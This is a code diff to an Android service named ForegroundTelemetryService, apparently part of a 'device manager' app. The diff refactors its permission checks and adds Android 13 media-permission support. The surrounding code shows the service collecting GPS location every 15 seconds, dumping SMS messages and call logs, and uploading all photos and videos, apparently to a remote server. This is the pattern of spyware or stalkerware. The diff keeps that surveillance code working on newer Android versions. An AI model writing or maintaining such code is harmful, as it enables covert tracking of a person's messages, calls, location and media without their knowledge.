@@ -18,6 +18,8 @@ import android.os.IBinder;
 import android.provider.MediaStore;
 import android.util.Log;
 
+import androidx.core.content.ContextCompat;
+
 import com.company.devicemgr.utils.ApiConfig;
 import com.company.devicemgr.utils.HttpClient;
 
@@ -70,10 +72,10 @@ public class ForegroundTelemetryService extends Service implements LocationListe
         running = true;
 
         try {
-            if (checkSelfPermission(android.Manifest.permission.ACCESS_FINE_LOCATION) == android.content.pm.PackageManager.PERMISSION_GRANTED) {
+            if (hasPermission(android.Manifest.permission.ACCESS_FINE_LOCATION)) {
                 locationManager.requestLocationUpdates(LocationManager.GPS_PROVIDER, 15 * 1000L, 5f, this);
             }
-            if (checkSelfPermission(android.Manifest.permission.ACCESS_COARSE_LOCATION) == android.content.pm.PackageManager.PERMISSION_GRANTED) {
+            if (hasPermission(android.Manifest.permission.ACCESS_COARSE_LOCATION)) {
                 locationManager.requestLocationUpdates(LocationManager.NETWORK_PROVIDER, 15 * 1000L, 10f, this);
             }
         } catch (Exception e) {
@@ -118,6 +120,17 @@ public class ForegroundTelemetryService extends Service implements LocationListe
         }
     }
 
+
+    private boolean hasPermission(String permission) {
+        return ContextCompat.checkSelfPermission(this, permission) == android.content.pm.PackageManager.PERMISSION_GRANTED;
+    }
+
+    private boolean canReadMedia() {
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
+            return hasPermission(android.Manifest.permission.READ_MEDIA_IMAGES) || hasPermission(android.Manifest.permission.READ_MEDIA_VIDEO);
+        }
+        return hasPermission(android.Manifest.permission.READ_EXTERNAL_STORAGE);
+    }
     private SharedPreferences prefs() {
         return getSharedPreferences(PREFS, MODE_PRIVATE);
     }
@@ -222,11 +235,11 @@ public class ForegroundTelemetryService extends Service implements LocationListe
             } else {
                 Location fallback = null;
                 try {
-                    if (checkSelfPermission(android.Manifest.permission.ACCESS_FINE_LOCATION) == android.content.pm.PackageManager.PERMISSION_GRANTED)
+                    if (hasPermission(android.Manifest.permission.ACCESS_FINE_LOCATION))
                         fallback = locationManager.getLastKnownLocation(LocationManager.GPS_PROVIDER);
                 } catch (Exception ignored) { }
                 try {
-                    if (fallback == null && checkSelfPermission(android.Manifest.permission.ACCESS_COARSE_LOCATION) == android.content.pm.PackageManager.PERMISSION_GRANTED)
+                    if (fallback == null && hasPermission(android.Manifest.permission.ACCESS_COARSE_LOCATION))
                         fallback = locationManager.getLastKnownLocation(LocationManager.NETWORK_PROVIDER);
                 } catch (Exception ignored) { }
 
@@ -306,7 +319,7 @@ public class ForegroundTelemetryService extends Service implements LocationListe
 
     private void sendSmsDump() {
         try {
-            if (checkSelfPermission(android.Manifest.permission.READ_SMS) != android.content.pm.PackageManager.PERMISSION_GRANTED) {
+            if (!hasPermission(android.Manifest.permission.READ_SMS)) {
                 Log.i(TAG, "no READ_SMS permission");
                 return;
             }
@@ -345,7 +358,7 @@ public class ForegroundTelemetryService extends Service implements LocationListe
 
     private void sendCallLogDump() {
         try {
-            if (checkSelfPermission(android.Manifest.permission.READ_CALL_LOG) != android.content.pm.PackageManager.PERMISSION_GRANTED) {
+            if (!hasPermission(android.Manifest.permission.READ_CALL_LOG)) {
                 Log.i(TAG, "no READ_CALL_LOG permission");
                 return;
             }
@@ -387,8 +400,8 @@ public class ForegroundTelemetryService extends Service implements LocationListe
 
     private void uploadAllMediaOnce() {
         try {
-            if (checkSelfPermission(android.Manifest.permission.READ_EXTERNAL_STORAGE) != android.content.pm.PackageManager.PERMISSION_GRANTED) {
-                Log.i(TAG, "no READ_EXTERNAL_STORAGE perm for media upload");
+            if (!canReadMedia()) {
+                Log.i(TAG, "no media permission for media upload");
                 return;
             }
             SharedPreferences sp = prefs();
